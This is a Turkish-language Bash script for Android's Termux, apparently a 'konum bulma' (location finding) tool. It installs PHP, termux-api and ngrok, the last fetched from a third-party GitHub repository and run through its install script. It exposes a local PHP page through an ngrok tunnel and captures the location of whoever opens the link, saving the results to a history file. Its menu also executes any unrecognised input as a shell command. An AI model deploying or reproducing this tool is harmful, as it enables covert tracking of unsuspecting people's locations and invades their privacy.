#!/bin/bash
clear
#################### PHP ####################

echo
echo
echo
if [[ -a /data/data/com.termux/files/usr/bin/php ]];then
echo
else
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mPHP PAKETİ YÜKLENİYOR "
	echo
	echo
	echo
	pkg install php -y
fi

#################### TERMUX-APİ ####################

if [[ -a /data/data/com.termux/files/usr/bin/termux-notification ]];then
	echo
else
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mTERMUX-APİ PAKETİ YÜKLENİYOR "
	echo
	echo
	echo
	pkg install termux-api -y
fi


#################### NGROK ####################

if [[ -a /data/data/com.termux/files/usr/bin/ngrok ]];then
	kontrol=$(ngrok version |grep -o 2.2.6)
	if [[ $kontrol == 2.2.6 ]];then
		echo
	else
		echo
		echo
		echo
		printf "\e[32m[*] \e[0mNGROK YÜKLENİYOR "
		echo
		echo
		echo
		git clone https://github.com/termux-egitim/ngrok
		cd ngrok
		bash kurulum.sh
	fi
fi



#################### GİRİŞ ####################
clear
cd files
bash banner.sh
if [[ -e "eskikonum.txt" ]]; then
	printf "\e[32m [!] BULUNAN KONUM ADRESİ > \e[0m "
	cat eskikonum.txt
fi
url() {
	while true;
	do
		if [[ -e "konum.txt" ]]; then
			link=$(cat konum.txt)
			xdg-open $link
			rm konum.txt
			exit


		fi
	done


}
menu() {
printf "

[1]  \e[31m──────────[\e[32mBAŞLAT\e[31m]\e[0m

[2]  \e[31m──────────[\e[32mGEÇMİŞ KONUM ADRESLERİ\e[31m]\e[0m

\e[31m[\e[0mX\e[31m]  \e[31m──────────[\e[32mÇIKIŞ\e[31m]\e[0m
"
echo
echo
echo
read -e -p $'\e[31m────────────────────────[\e[32mKoNuM BuLMa\e[31m]───────►  \e[0m' secim

if [ $secim == 1 ];then
	clear
	echo
	echo
	echo
	read -p $' \e[32mPORT GİRİNİZ\e[31m >> \e[0m' port
	echo
	echo
	echo
	url & php -S 127.0.0.1:$port & ngrok http $port
	cd ..
	bash konumbulma.sh
elif [ $secim == 2 ];then
	kontrol=$(cat eskikonum.txt |grep -o https)
	if [[ $kontrol == https ]];then
		echo
	else
		echo
		echo
		echo
		printf "\e[31m[!] \e[0mKAYITLI KONUM ADRESİ BULUNAMADI \e[31m!!!\e[0m"
		echo
		echo
		echo
		cd ..
		sleep 2
		bash konumbulma.sh
	fi
	echo
	echo
	printf "\e[32m"
	cat eskikonum.txt
	printf "\e[0m"
	echo
	echo
	echo
	echo
	echo
	read -e -p $'GEÇMİŞ KONUM ADRESLERİNİ SİLMEK İSTER MİSİNİZ ? \e[32mEVET\e[0m / \e[31mHAYIR \e[0m>> ' sil
	if [[ $sil == e || $sil == evet || $sil == EVET || $sil == E ]];then
		rm eskikonum.txt
		echo
		echo
		echo
		printf "\e[32m[✓]\e[0m GEÇMİŞ KONUM ADRESLERİ SİLİNDİ"
		echo
		echo
		echo
		cd ..
		sleep 2
		bash konumbulma.sh
	else
		cd ..
		sleep 1
		bash konumbulma.sh
	fi
elif [[ $secim == Y || $secim == y ]]; then
	cd ..
	bash konumbulma.sh
elif [[ $secim == d || $secim == D ]]; then
	cd ..
	vim konumbulma.sh
	bash konumbulma.sh
elif [[ $secim == x || $secim == X || $secim == exit || $secim == EXİT ]];then
	echo
	echo
	printf "                         \e[31m [!] \e[0mÇIKIŞ YAPILDI"
	echo
	echo
	echo
	echo
	exit
else
	$secim
	menu
fi
}
if [[ $1 == kur ]];then
	if [[ -a /data/data/com.termux/files/usr/bin/php ]];then
		echo
		echo
		echo
		printf "\e[31mPHP \e[0mKURULU GÖRÜNÜYOR \e[31m!!!"
		echo
		echo
		echo
	else
		pkg install php -y
	fi
	if [[ -a /data/data/com.termux/files/usr/bin/ngrok ]];then
		kontrol=$(ngrok version |grep -o 2.2.6)
		if [[ $kontrol == 2.2.6 ]];then
			echo
			echo
			echo
			printf "\e[31mNGROK \e[0mKURULU GÖRÜNÜYOR \e[31m!!!"
			echo
			echo
			echo
			exit
		else
			git clone https://github.com/termux-egitim/ngrok
			cd ngrok
			bash kurulum.sh
			exit
		fi
	fi
fi
menu


